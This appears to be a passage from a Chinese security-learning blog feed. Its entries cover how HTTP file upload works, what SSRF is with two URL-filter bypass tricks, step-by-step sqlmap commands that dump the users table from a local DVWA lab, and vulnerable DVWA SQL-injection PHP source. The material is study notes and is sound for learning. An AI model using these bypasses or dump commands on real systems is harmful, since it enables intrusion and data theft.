空格转换为“+”，不对特殊字符编码</p><p>归纳的三个重要点：</p><p>1.提交方式必须为post；<br>2.表单中有文件上传的表单项必须为<input type="file"/>；<br>3.必须指定表单类型enctype=”multipart/form-data”。</p><p>例子（代码）：</p><pre><code>&lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;      &lt;input type=&quot;file&quot; name=&quot;file&quot; value=&quot;请选择文件&quot;&gt;&lt;br /&gt;      &lt;input type=&quot;submit&quot;&gt;    &lt;/form&gt;</code></pre><h5 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h5><p>​       WEB服务器端程序接收到“multipart/form-data”类型的HTTP请求消息后，其核心和基本的编程工作就是读取请求消息中的实体内容，然后解析出每个分区的数据，接着再从每个分区中解析出描述头和主体内容部分。<br>​       要在jsp里获得上传的文件，就是通过request.getInputStream()来得到上传的整个post实体的流，用 request.getHeader(“Content-Type”)来取得实体内容的分界字符串，然后根据http协议，分析取得的上传的实体流，把文 件部分给筛出来，然后在服务器端保存到磁盘文件中，另外因为上传文件时，form的属性enctype=”multipart/form-data”，所 以其他表单参数在上传文件时也无法得到，除了筛出文件进行保存，还应该把其他的参数一起取出保存，以便在jsp程序中调用。</p><p>具体方法如下：<br>1、 根据request获得文件输入流；<br>2、 依次读取行，此时进行两部分内容的处理，<br>  a:获取文件名<br>  以 filename=”xxxxx”来标识一个文件头，<br>  b:获取其他表单值（因为其流是按照multipart/form-data方式来编码的，所以在服务器端，不能     直接用request.getParameter()来获得）<br>    以name=”xxxx”来标识一个表单头，</p><p>​    都以流头的字符标识为值的结束；</p><p>实体内容内部的字段分隔界线是在content-type头中指定的字段分隔界线前面增加了两个减号（-）字符而形成的（由浏览器随机生成，由浏览器 保证不会与用户上传的文件内容重复）<br>当找到一个分区的开始位置后，程序还需要分辨出分区中的描述头和主体内容，并对这两部分内容分开存储。如何分辨出一个分区的描述头和主体部分呢？每 个分区中的描述头和主体内容之间有一空行，再加上描述头后面的换行，这就说明描述头和主体部分之间是使用“\n”、“\r”、“\n”、“\r”这四个连 续的字节内容进行分隔。因此，程序需要把“\n”、“\r”、“\n”、“\r”这四个连续的字节内容作为描述头和主体部分之间的分隔界线，并在字节数组 缓冲区buffer中寻找这个特殊的分隔界线来识别描述头和主体部分。</p><p>3、 根据读到的文件信息（文件名，文件大小等），判断是否合法（文件类型、文件大小判断）。如果合适则返回，如果不合适则创建同名文件并将其删除；</p><p>演示Form 显示提交的流的格式：  UI </p><p>当前的主流文件上传组件性能对比<br>    1、smartUpload          2、FileUpload           3、Cos<br>实例演示性能对比：<br>jspSmartUpload<br>fileUpLoad<br>cos<br>20M 、75M 、300M</p><p>所以选择Cos作为内部读取解析文件流的组件；<br><strong>使用组件而不是自己来解析文件流的原因：</strong><br>1、 读取文件大小的限制，如同smartUpload 组件一样，上传的文件大小会受到JVM内存容量的限制，因为读取的文件流都是存储在内存之中的，而fileUpLoad和cos采用的是当文件读取到了一定的大小就先写到硬盘上的临时目录中；</p><p>2、 读取效率的限制 ，组件可以根据文件的大小设定一定的缓存，来提升读取的效率，分配好内存的缓存大小，及硬盘目录缓存大小；<br>（文件缓存循环机制作的简要介绍，缓冲区如何正好读取到分区界限）</p><p><strong>此类组件的使用及封装方式：</strong><br>MultipartRequest mu = new MultipartRequest(HttpServletRequest request,Directory,MaxSize,”gbk”);</p><p>我们只需要传递一个申请的request流，目录名，它会自动完成相应的解析文件流的过程，然后直接在对应设置的目录中生成对应的同名文件；<br>代理模式：</p><pre><code>HttpServerRequestProxy：代理表单请求InputStreamRequestProxy：代理输入流</code></pre><p>整个的代理流程如下：<br>首先类HttpServerRequestProxy 继承于HttpServletRequestWrapper，并覆写它父类的getInputStream() 方法，在这个方法中我们设置它返回InputStreamRequestProxy流对象（当然这个类必须要与ServletInputstream 兼容，所以它必定继承于ServletInputstream），然后我们覆写这个流的read()方法，并在这个方法内部我们对文件上传的进度，速度进 行控制，而不是由组件提供的特定的进度监视器来获取准确的精度；</p><p>运行流程如下：<br>    组件以HttpServerRequestProxy对象为参数进行初始化，在其内部再调用参数的getInputStream()方法获取整个传入流，再使用流的read()方法读取实际内容，这样整个处理流的过程，都是从代理中通过的；</p><h5 id="服务器端获取文件传输速度的计算方式："><a href="#服务器端获取文件传输速度的计算方式：" class="headerlink" title="服务器端获取文件传输速度的计算方式："></a>服务器端获取文件传输速度的计算方式：</h5><ol><li>根据前后读取buffer的时间来测算，但是由于读取request 返回的流太过频繁，导致以毫秒计算，根本没有办法来计算实时速度；（不可行）</li><li>采用一个控制量，固定读取一定数量的buffer后，再根据服务器读取这段的长度所使用的时间来设定速度值；（需要设定BufferNUM的值，实时性较好，资源消耗最少）；</li><li>采用定时器，每过N秒访问一次文件读取的进度，设置相关的信息，但返回的上传速度可能为 0，或者是无穷；</li></ol><h5 id="判断上传文件（单个）大小是否符合服务器设置："><a href="#判断上传文件（单个）大小是否符合服务器设置：" class="headerlink" title="判断上传文件（单个）大小是否符合服务器设置："></a>判断上传文件（单个）大小是否符合服务器设置：</h5><p>（如何快速判断，而不是等二进制流读取完再返回错误信息。）<br>javaScript 客户端脚本判断，但是针对不同的浏览器，不同的权限设置，不一定能成功；（且于服务器端实际读取的文件大小精度有差异，难以靠以上传的流的大小来保证文件是否已经上传完毕）<br>function ShowFileSize()<br>{<br>            var fso = new ActiveXObject(“Scripting.FileSystemObject”);<br>        var f, s, file;<br>        if (“object” != typeof(fso))<br>            return;<br>        file = FormName.fileName.value;<br>        f = fso.GetFile(file);<br>        alert(f.size);<br>}</p><p>服务器即时判断：服务器读取流，直到读取的流的数量大于所设定大的限制，则返回错误信息。（占太多的时间，且浪费服务器资源）<br>服务器端判断：在发送POST请求时，信息头里面都包含 Content-Length 属性，其代表着整个请求的数据长度。我们可以通过简单的判断这个Header数据，发现超过了我们允许的长度则直接断开连接，这样就不会对服务器造成资源浪费。<br>演示：simpleFileUpload   index.jsp</p><h5 id="如何判断批量上传的每一个文件的大小："><a href="#如何判断批量上传的每一个文件的大小：" class="headerlink" title="如何判断批量上传的每一个文件的大小："></a>如何判断批量上传的每一个文件的大小：</h5><p>（使用方法二）<br>1． 在客户端判断文件大小，只提交服务器一个文件流，但是文件大小的精确程度会有一定程度的不同，导致一种假死现象；还会有客户端js代码的权限问题。</p><p>2． 在服务器端判断文件大小，但是服务器在真实读取文件流之前 ，使用上面的方法二，只能得到整个流的大小，不能得到，单个文件的大小；这样只能实现整个上传进度的统计。而不可能实现多个文件分开计算其精度的方法；<br>演示：simpleFileUpload   pLOneStream.jsp</p><p>3．每个文件提交一个文件流，服务器对每个流处理时返回文件大小及文件进度。方法是，每个 <input type=”file”> 标签都置于一个独立的form表单中，然后一次提交；</p><h5 id="服务器如何在真正文件上传-读取流-之前获得文件名？"><a href="#服务器如何在真正文件上传-读取流-之前获得文件名？" class="headerlink" title="服务器如何在真正文件上传(读取流)之前获得文件名？"></a>服务器如何在真正文件上传(读取流)之前获得文件名？</h5><p>​    按照正常的Http上传文件的方式是不能实现的，只有在客户端向服务器提交表单之前先向服务器提交一个Ajax请求，然后服务器调用Ajax请求传递过来 的参数（文件名）来判断是否符合服务器提交要求，如果符合则在客户端的回调函数中提交本文件所属的form表单；如果不符合则返回出错信息；</p><p>如果文件不合法，服务器、客户端如何而实现：<br>（此时服务器已经必定在读http传递过来的文件流，除非判断文件名是在客户端判断，或者是使用Ajax在服务器端判断的方法）<br>1、 客户端使用Ajax 接受服务器返回出错信息，并在服务器内部读取流文件时，如果发现文件不合法则抛出特定的异常，并在服务器内部自行捕获处理；<br>2、 流覆盖；<br>流覆盖演示：streamCover<br>原理：将两个请求同时提交到一个地方，导致后面的流截断前面正在上传的文件流，从而达到删除正在上传的文件的效果；（删除正在上传的文件）</p><h5 id="客户端从服务器读取文件上传进度信息："><a href="#客户端从服务器读取文件上传进度信息：" class="headerlink" title="客户端从服务器读取文件上传进度信息："></a>客户端从服务器读取文件上传进度信息：</h5><h5 id="Ajax"><a href="#Ajax" class="headerlink" title="(Ajax)"></a>(Ajax)</h5><p><strong>几个重要的步骤：</strong><br>1、  构建Ajax 对象；（需要针对不同的浏览器进行构建），参见代码；cosex—UpLoadFile.html—getAjax；<br>2、  设置回调函数 onreadystatechange;<br>3、  设置携带特定参数信息的URL；<br>4、  发送请求；<br>5、  等待回调；</p><p><strong>需要注意的问题：</strong><br>1、  IE缓存问题；<br>解决方法：<br>清除由于IE缓存造成的Ajax不能多次发出请求：<br>服务器端：<br>response.setHeader(“Cache-Control”,”no-cache”);<br>客户端<br> 在Ajax发出的请求URL后添加一个随机数（Math.random()），这样对于IE来说每次请求的页面都不是同一个页面就不会造成直接调用缓存页面的问题；</p><p>2、  同步还是异步请求的问题；<br>Ajax的优势就是可以异步发送请求到服务器，而不需要服务器实时的去相应，所以设为异步；</p><p><strong>服务器端相应Ajax请求的几个问题：</strong><br>1、  Ajax异步请求与传统请求在服务器端的判断方法；<br>request.getHeader(“x-requested-with”);<br>b．在URL后添加一个与服务器端约定好的参数；<br>（在服务器端都必须显示的去判断）<br>2、  字符编码问题；<br>Ajax请求默认的参数默认均为 ”ISO8859-1”，在服务器端必须要进行解码；</p><p><strong>与进度条的集成：</strong><br>根据Ajax从服务器获取的文件信息（文件大小，上传速度，上传百分比等信息），信息每更新一次就设定进度条的值；动态隐藏和显示显示进度条的div；</p><p><strong>UI上传组件应该具备以下基本功能：</strong></p><ol><li>能让用户提供一个上传路径</li><li>能够限制上载文件的大小（防止上传文件过大）<ol start="3"><li>能够支持多个文件同时上传及限制并行上传文件的个数（多文件并行上传）</li><li>可以在服务器端进行异常错误捕获，并进行适当的处理</li><li>上传组件的稳定性（上传速度能够保持稳定）</li></ol></li><li>可以设定屏蔽（或指定）固定类型的文件（如以 .exe结尾的文件等）</li><li>能够向用户提供一个友好的交互界面，实时显示该文件上传的进度、当前用户的网络状态、上传此文件已花费时间、传输速率，剩余时间等信息</li><li>支持对已上传或正在上传文件的删除</li><li>用户使用及操作及可扩展 ，并能够灵活的集成到其它项目中</li></ol><pre><code>     Ajax的同步问题 ；（两个不同的页面同时访问一个服务端URL，导致两者得到的值竟然是后者的值）</code></pre><p>一个页面的，多表单提交的问题解决方案：<br>1．  使用Ajax 实现。<br>2．  使用 form 的target 属性提交到一个本页面的iframe 的name 上，那样页面就不会跳转。</p><p>Javascript问题：<br>引号中传字符串值； 可以单双引号嵌套使用<br>Setinterval（）函数传值，采用<br>function(){ realFunction(args)} 的匿名传值方法；<br>3．  取消计时器clearInterval(timerID);</p><p>一个页面多次提交导致流被截断；<br>       如果是提交到一个隐藏的frame中的话，那么会导致流被截断，必须提交到不同的隐藏frame中，才可以异步提交到服务器。</p><p><a href="http://blog.sina.com.cn/s/blog_8f32dc250100wva8.html" target="_blank" rel="noopener">转载来源博客</a></p><p><a href="https://blog.csdn.net/qq_27053493/java/article/details/100589143" target="_blank" rel="noopener">参考博客</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件上传原理&quot;&gt;&lt;a href=&quot;#文件上传原理&quot; class=&quot;headerlink&quot; title=&quot;文件上传原理&quot;&gt;&lt;/a&gt;文件上传原理&lt;/h1&gt;&lt;p&gt;文件上传：因为浏览器本身的限制，浏览器是不能直接操作文件系统的，需要通过浏览器所暴露出来的统一接口，由用户主
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>什么是SSRF？</title>
    <link href="http://yoursite.com/2020/05/14/%E4%BB%80%E4%B9%88%E6%98%AFSSRF%EF%BC%9F/"/>
    <id>http://yoursite.com/2020/05/14/%E4%BB%80%E4%B9%88%E6%98%AFSSRF%EF%BC%9F/</id>
    <published>2020-05-14T12:38:40.833Z</published>
    <updated>2020-05-10T06:06:40.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF漏洞学习"><a href="#SSRF漏洞学习" class="headerlink" title="SSRF漏洞学习"></a>SSRF漏洞学习</h1><h2 id="什么是SSRF？"><a href="#什么是SSRF？" class="headerlink" title="什么是SSRF？"></a>什么是SSRF？</h2><p>SSRF漏洞寻找内网入口，是突破内网的一个方法。<br>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><h5 id="（服务端跟客户端的区别："><a href="#（服务端跟客户端的区别：" class="headerlink" title="（服务端跟客户端的区别："></a>（服务端跟客户端的区别：</h5><p>服务端是一种有针对性的服务程序。它的主要表现形式以“windows窗口程序”与“控制台”为主。一般大型的服务端都是在Linux环境下搭建。运行服务端的电脑称之为“服务器”。</p><p>客户端与服务端：服务端，是为客户端服务的。服务的内容诸如向客户端提供资源，保存客户端数据；客户端就是我们使用的电脑（包括我们使用的浏览器IE,Firefox）；服务器端就是存放网页与数据库数据的服务器。</p><p>通俗一点讲：服务端应该是服务器端，就是都访问它，它共享数据大家来用，它就是服务器端，每个访问服务器端的都是客户端！</p><p>或者也可以这样说：服务器端是远程服务器，运行结果是由服务器产生的；客户端就是网友的电脑。所有的动态网页都是在服务器端执行的，例如ASP、PHP、JSP；所有的静态网页都是在客户端执行的，例如JavaScript、Flash都是属于静态网页。 </p><p>举例：例如你使用JavaScript写了e799bee5baa6e58685e5aeb931333264656666一个显示日期的程序，它显示的只是客户端的系统日期，如果你修改了你的电脑的系统日期，那么这个JavaScript程序的运行结果也会变。<br>而如果使用ASP编写了显示日期的程序，如 &lt;%=date%&gt; ，显示的则是服务器的日期。如果你修改了你的电脑的系统日期，这个显示结果是不会变的 。</p><h5 id="参考网址1-参考网址2-）"><a href="#参考网址1-参考网址2-）" class="headerlink" title="参考网址1  参考网址2  ）"></a><a href="https://zhidao.baidu.com/question/337589385.html?sort=11&rn=5&pn=5" target="_blank" rel="noopener">参考网址1</a>  <a href="https://baike.baidu.com/item/服务端/6492316?fr=aladdin" target="_blank" rel="noopener">参考网址2</a>  ）</h5><h2 id="SSRF漏洞的寻找"><a href="#SSRF漏洞的寻找" class="headerlink" title="SSRF漏洞的寻找"></a>SSRF漏洞的寻找</h2><h4 id="一、从WEB功能上寻找"><a href="#一、从WEB功能上寻找" class="headerlink" title="一、从WEB功能上寻找"></a>一、从WEB功能上寻找</h4><p>我们从上面的概述可以看出，SSRF是由于服务端获取其他服务器的相关信息的功能中形成的，因此我们大可以列举几种在web 应用中常见的从服务端获取其他服务器信息的的功能。<br>1）分享：通过URL地址分享网页内容<br>早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的<tilte></title>标签或者<meta name="description" content=""/>标签中content的文本内容作为显示以提供更好的用户体验。</p><p><img src="https://img-blog.csdnimg.cn/20190704195033842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MTMzNzE3,size_16,color_FFFFFF,t_70" alt=""></p><p>2）转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3）在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等</p><p>4）图片加载与下载：通过URL地址加载或下载图片<br>图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了？ ，没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，所以就可能造成SSRF问题）。</p><p>5）图片、文章收藏功能<br>此处的图片、文章收藏中的文章收藏就类似于功能一、分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。<br>6）未公开的api实现以及其他调用URL的功能<br>此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p><p>（备注：API，即应用程序编程接口。<br>说得更加通俗易懂一些，别人写好的代码，或者编译好的程序，提供给你使用，就叫做API。你使用了别人代码（或者程序）中的某个函数、类、对象，就叫做使用了某个API。<a href="baijiahao.baidu.com/s?id=1586026960877760125&wfr=spider&for=pc">参考博客</a>）</p><h4 id="二、从URL关键字中寻找"><a href="#二、从URL关键字中寻找" class="headerlink" title="二、从URL关键字中寻找"></a>二、从URL关键字中寻找</h4><p>在对功能上存在SSRF漏洞中URL地址特征的观察，通过我一段时间的收集，大致有以下关键字:</p><p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>3g<br>display<br>sourceURl<br>imageURL<br>domain<br>…</p><p>如果利用google 语法加上这些关键字去寻找SSRF漏洞，耐心的验证，现在还是可以找到存在的SSRF漏洞。</p><h2 id="SSRF-漏洞的验证"><a href="#SSRF-漏洞的验证" class="headerlink" title="SSRF 漏洞的验证"></a>SSRF 漏洞的验证</h2><h4 id="1）基本判断（排除法）"><a href="#1）基本判断（排除法）" class="headerlink" title="1）基本判断（排除法）"></a>1）基本判断（排除法）</h4><p>例如： 这样的代码</p><pre><code>http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png</code></pre><p>排除法一：<br>你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<code>http://www.baidu.com/img/bd_logo1.png</code>，说明不存在SSRF漏洞。<br>排除法二：<br>你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p><p><a href="http://p9.qhimg.com/t01554ac9cba1ae96e9.png" target="_blank" rel="noopener"><img src="http://p9.qhimg.com/t01554ac9cba1ae96e9.png" alt="img"></a></p><p><strong>问题1：如何设置burpsuite截断图片请求？是Intercept Client Requests：设置过滤客户端请求；Intercept Server Response：设置过滤服务端响应；这两个按钮？</strong></p><p><strong>答：</strong></p><p>为什么这边用排除法来判断是否存在SSRF，举例如下：</p><p><a href="http://p2.qhimg.com/t01080058bb303b1e6f.png" target="_blank" rel="noopener"><img src="http://p2.qhimg.com/t01080058bb303b1e6f.png" alt="img"></a></p><pre><code>http://read.*******.com/image?imageUrl=http://www.baidu.com/img/bd_logo1.png</code></pre><p>现在大多数修复SSRF的方法基本都是区分内外网来做限制（暂不考虑利用此问题来发起请求，攻击其他网站，从而隐藏攻击者IP，防止此问题就要做请求的地址的白名单了），如果我们请求 ：</p><pre><code>http:``//read.******.com/image?imageUrl=http://10.10.10.1/favicon.ico</code></pre><p>而没有内容显示，我们是判断这个点不存在SSRF漏洞，还是<code>http://10.10.10.1/favicon.ico</code>这个地址被过滤了，还是<code>http://10.10.10.1/favicon.ico</code>这个地址的图片文件不存在，如果我们事先不知道<code>http://10.10.10.1/favicon.ico</code>这个地址的文件是否存在的时候是判断不出来是哪个原因的，所以我们采用排除法。</p><h4 id="2）实例验证"><a href="#2）实例验证" class="headerlink" title="2）实例验证"></a>2）实例验证</h4><p>经过简单的排除验证之后，我们就要验证看看此URL是否可以来请求对应的内网地址。在此例子中，首先我们要获取内网存在HTTP服务且存在favicon.ico文件的地址，才能验证是否是SSRF漏洞。<br>找存在HTTP服务的内网地址：<br>一、从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址<br>二、通过二级域名暴力猜解工具模糊猜测内网地址</p><p><a href="http://p0.qhimg.com/t01111bbf7ba9e818bc.png" target="_blank" rel="noopener"><img src="http://p0.qhimg.com/t01111bbf7ba9e818bc.png" alt="img"></a></p><pre><code>example:ping xx.xx.com.cn</code></pre><p>可以推测10.215.x.x 此段就有很大的可能： <code>http://10.215.x.x/favicon.ico</code> 存在。</p><p>在举一个特殊的例子来说明：</p><pre><code>http://fanyi.baidu.com/transpage?query=http://www.baidu.com/s?wd=ip&amp;source=url&amp;ie=utf8&amp;from=auto&amp;to=zh&amp;render=1</code></pre><p><a href="http://p7.qhimg.com/t01365be44f183f878d.png" target="_blank" rel="noopener"><img src="http://p7.qhimg.com/t01365be44f183f878d.png" alt="img"></a></p><p>此处得到的IP 不是我所在地址使用的IP，因此可以判断此处是由服务器发起的<code>http://www.baidu.com/s?wd=ip</code> 请求得到的地址，自然是内部逻辑中发起请求的服务器的外网地址（为什么这么说呢，因为发起的请求的不一定是fanyi.baidu.com，而是内部其他服务器）,那么此处是不是SSRF，能形成危害吗？  严格来说此处是SSRF，但是百度已经做过了过滤处理，因此形成不了探测内网的危害。</p><h2 id="SSRF-漏洞中URL地址过滤的绕过"><a href="#SSRF-漏洞中URL地址过滤的绕过" class="headerlink" title="SSRF 漏洞中URL地址过滤的绕过"></a>SSRF 漏洞中URL地址过滤的绕过</h2><p>1）<code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code> 请求是相同的</p><p><a href="http://p9.qhimg.com/t0156e722ce8229ee37.png" target="_blank" rel="noopener"><img src="http://p9.qhimg.com/t0156e722ce8229ee37.png" alt="img"></a></p><p>此脚本访问请求得到的内容都是<code>www.baidu.com</code>的内容。 </p><p>2）ip地址转换成进制来访问</p><p><a href="http://p0.qhimg.com/t01463b751ace2a25f1.png" target="_blank" rel="noopener"><img src="http://p0.qhimg.com/t01463b751ace2a25f1.png" alt="img"></a></p><p>此脚本解析的地址都是 115.239.210.26，也可以使用ping 获取解析地址：</p><p><a href="http://p8.qhimg.com/t01463bbf60442953e7.png" target="_blank" rel="noopener"><img src="http://p8.qhimg.com/t01463bbf60442953e7.png" alt="img"></a></p><p>如果WEB服务简单的过滤参数中获取的URL地址，没有判断真正访问的地址，是有可能被此两种方法绕过的。</p><p><a href="http://bobao.360.cn/learning/detail/240.html" target="_blank" rel="noopener">参考的博客：http://bobao.360.cn/learning/detail/240.html</a></p><p><a href="http://drops.wooyun.org/tips/750" target="_blank" rel="noopener">过滤参考</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SSRF漏洞学习&quot;&gt;&lt;a href=&quot;#SSRF漏洞学习&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞学习&quot;&gt;&lt;/a&gt;SSRF漏洞学习&lt;/h1&gt;&lt;h2 id=&quot;什么是SSRF？&quot;&gt;&lt;a href=&quot;#什么是SSRF？&quot; class=&quot;head
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Dvwa SQL注入（sqlmap的使用）</title>
    <link href="http://yoursite.com/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/"/>
    <id>http://yoursite.com/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/</id>
    <published>2020-05-14T12:37:13.436Z</published>
    <updated>2020-05-14T07:29:35.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Dvwa-SQL注入（sqlmap的使用）"><a href="#Dvwa-SQL注入（sqlmap的使用）" class="headerlink" title="Dvwa SQL注入（sqlmap的使用）"></a>Dvwa SQL注入（sqlmap的使用）</h1><p>Sqlmap中文手册（讲得非常详细）参考链接：<a href="https://blog.csdn.net/wn314/article/details/78872828" target="_blank" rel="noopener">https://blog.csdn.net/wn314/article/details/78872828</a></p><p>1.输入sqlmap.py –u url –dbs （URL是输入id后的页面的url，也就是提交过数据的页面的url）不行所以得加上cookie（按f12后打开火狐浏览器的开发者工具-网络栏-点击网络栏下面一行右边会弹出框框-点击Cookie栏即可找到cookie）</p><p>所以输入：</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; –dbs</code></p><p>得到目标所有数据库名</p><img src="C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20200514152522663.png" alt="image-20200514152522663" style="zoom: 150%;" /><p>（备注：（1）关于cookie，有两种情况sqlmap会用到：</p><p>1.要测试的页面只有在登录状态下才能访问，登录状态用cookie识别</p><p>2.想要检测是否存在cookie注入</p><p>（2）-u参数表示url，指定连接目标</p><p>–dbs表示列出目标有哪些数据库）</p><p>2.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –tables</code></p><p>得到数据库内所有表</p><img src="C:\Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20200514152600062.png" alt="image-20200514152600062" style="zoom:150%;" /><p>（备注：（1）-D：指定数据库</p><p>-tables：列举数据库中所有表）</p><p>3.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –T users --columns</code></p><p>得到表中所有字段名及类型</p><p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200514152654013.png" alt="image-20200514152654013"></p><p>（备注：（1）-T，指定表</p><p>–columns，指定表中所有列的名字和数据类型）</p><p>4.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –T users --count</code></p><p>得到表中的数据总数</p><p>![说明: C:\Users\DELL\AppData\Roaming\Tencent\Users\481820058\QQ\WinTemp\RichOle$)H2{E11@~2QE)`5CXPJ%WS.png](file:///C:\Users\DELL\AppData\Local\Temp\msohtmlclip1\01\clip_image002.jpg)</p><p>5.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –T users –dump</code></p><p>得到所有数据</p><p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CLocal%5CTemp%5Cmsohtmlclip1%5C01%5Cclip_image004.jpg" alt="说明: C:\Users\DELL\AppData\Roaming\Tencent\Users\481820058\QQ\WinTemp\RichOle\P)FU4(F5RSOJT4VAQV}U1IC.png"></p><p>备注：（1）–dump，列举数据。它也会保存数据到CSV格式文件中，文件具体路径会在输出中给出。</p><p>参考题解：<a href="https://blog.csdn.net/weixin_42555985/article/details/87546621" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42555985/article/details/87546621</a></p><p>Medium级别：</p><p>1.需要自己加入id=…（因为提交后的url里面没有  ?id=…  ，所以得自己补充）</p><p>如：第一步输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;submit=submit&quot; --cookie &quot;security=medium;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; –dbs</code></p><p>2.接下去的步骤同上</p><p>High级别：同medium级别</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Dvwa-SQL注入（sqlmap的使用）&quot;&gt;&lt;a href=&quot;#Dvwa-SQL注入（sqlmap的使用）&quot; class=&quot;headerlink&quot; title=&quot;Dvwa SQL注入（sqlmap的使用）&quot;&gt;&lt;/a&gt;Dvwa SQL注入（sqlmap的使用）&lt;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>DVWA SQL injection</title>
    <link href="http://yoursite.com/2020/05/14/DVWA%20SQL%20injection/"/>
    <id>http://yoursite.com/2020/05/14/DVWA%20SQL%20injection/</id>
    <published>2020-05-14T12:37:04.240Z</published>
    <updated>2020-05-13T07:18:46.930Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DVWA-SQL-injection"><a href="#DVWA-SQL-injection" class="headerlink" title="DVWA SQL injection"></a>DVWA SQL injection</h1><h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { //isset()函数用于检测变量是否已设置并且非null。被设置返回TRUE；REQUEST用于获取表单数据，表单属性名为submit，判断是否存在    // Get input     $id = $_REQUEST[ &#39;id&#39; ]; //定义变量id存传过来的id数据    // Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; //按照id值找first_name,last_name的值    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //mysqli_query(connection，query，resultmode)函数执行某个针对数据库的查询//connection：MySQL连接，query规定查询字符串，resultmode可省//result存数据//or后面是判断是否连接成功，三元判断，执行了就返回真    // Get results     while( $row = mysqli_fetch_assoc( $result ) ) {         // Get values         $first = $row[&quot;first_name&quot;];         $last  = $row[&quot;last_name&quot;];         // Feedback for end user //打印输出结果        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br 